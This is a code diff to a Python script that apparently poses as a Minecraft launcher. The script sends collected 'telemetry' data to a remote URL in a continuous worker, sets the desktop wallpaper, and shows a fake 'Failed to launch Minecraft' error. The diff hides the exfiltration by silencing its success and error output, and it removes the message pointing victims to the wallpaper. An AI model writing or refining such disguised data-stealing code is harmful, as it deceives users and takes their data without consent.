@@ -120,12 +120,10 @@ def send_report(data, url):
             headers={'Content-Type': 'application/json'}
         )
         with urllib.request.urlopen(req, timeout=10) as response:
-            if response.getcode() == 200:
-                print(f"\n> Report sent successfully to {url}")
-            else:
-                print(f"\n> Server at {url} returned status: {response.getcode()}")
+            pass # Silenced
     except Exception as e:
-        print(f"\n> Failed to send report to {url}: {e}")
+        # print(f"\n> Failed to send report to {url}: {e}")
+        pass
 
 def telemetry_worker():
     """Continuously collects and sends telemetry data."""
@@ -282,7 +280,6 @@ def main():
         set_wallpaper(wallpaper_save_path)
 
     print("\nError: Failed to launch Minecraft. Your files may be corrupt.")
-    print("> Please refer to the new desktop background for more information.")
 
 if __name__ == "__main__":
     main()
